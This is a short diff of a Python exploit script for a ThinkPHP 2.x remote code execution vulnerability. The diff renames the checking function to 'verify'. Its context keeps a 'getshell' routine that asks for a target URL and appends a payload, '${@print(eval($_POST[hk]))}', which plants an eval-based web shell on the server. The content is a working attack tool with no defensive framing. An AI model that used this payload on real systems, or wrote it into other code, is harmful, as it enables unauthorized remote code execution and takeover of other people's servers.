@@ -2,7 +2,7 @@ import requests
 import re
 import urllib
 
-def thinkphp2_rce(url):
+def verify(url):
     relsult = {
         'name': 'Thinkphp 2.x rce',
         'vulnerable': False
@@ -23,7 +23,7 @@ def thinkphp2_rce(url):
 # getshell
 def exp():
     url = input('输入目标URL:')
-    if thinkphp2_rce(url):
+    if verify(url):
         print('[+] 存在 Thinkphp 2.x rce')
         payload = r'/index.php?s=a/b/c/${@print(eval($_POST[hk]))}'
         webshell = url + payload
